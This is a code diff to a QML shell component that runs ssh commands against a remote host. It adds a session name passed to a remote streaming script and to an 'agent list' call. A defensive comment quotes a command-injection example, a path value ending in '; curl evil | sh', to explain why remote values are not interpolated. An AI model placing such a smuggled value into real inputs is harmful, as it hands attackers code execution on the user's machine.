@@ -37,6 +37,8 @@ QtObject {
   // herdr was not found there — the channel would only ever emit "down", so
   // it is not worth opening.
   property string herdrPath: ""
+  // From `kettle-remote install --session`; empty reads the default socket.
+  property string session: ""
   // Deliberately no `store` property: naming it `store` here shadowed the
   // Panel's PotStore id inside the delegate, so `store: store` bound the
   // property to itself and every snapshot went nowhere. The poller emits
@@ -176,17 +178,18 @@ QtObject {
     // script text. herdrPath in particular is probed from the remote host, so
     // interpolating it would hand a compromised host code execution here —
     // `command -v herdr` returning "/bin/herdr; curl evil | sh" would run.
-    // The host name comes from a token filename and deserves the same care.
+    // Host and session names are charset-checked on load; both land here.
     command: [
       "bash", "-c",
       'ssh -o BatchMode=yes -o ControlMaster=no -o ControlPath="$HOME/.ssh/cm-%r@%h:%p" ' +
       '-o ServerAliveInterval=30 -o ServerAliveCountMax=2 -o ConnectTimeout=10 ' +
-      '-- "$1" "KETTLE_HERDR=$2 bash -s" < "$3" | "$4"',
+      '-- "$1" "KETTLE_HERDR=$2 KETTLE_SESSION=$5 bash -s" < "$3" | "$4"',
       "kettle-channel",           // $0
       root.host,                  // $1
       root.herdrPath,             // $2
       root.pluginDir + "bin/kettle-herdr-stream.sh",
-      root.pluginDir + "bin/kettle-line-guard"
+      root.pluginDir + "bin/kettle-line-guard",
+      root.session                // $5 — empty means the default socket
     ]
 
     stdout: SplitParser { onRead: function(line) { root.handleLine(line) } }
@@ -250,7 +253,8 @@ QtObject {
     command: ["ssh", "-o", "BatchMode=yes", "-o", "ControlMaster=no",
               "-o", "ControlPath=" + Quickshell.env("HOME") + "/.ssh/cm-%r@%h:%p",
               "-o", "ConnectTimeout=8", "--", root.host,
-              (root.herdrPath || "herdr") + " agent list"]
+              (root.herdrPath || "herdr") + " agent list"
+                + (root.session ? " --session " + root.session : "")]
     stdout: StdioCollector {
       waitForEnd: true
       onStreamFinished: {
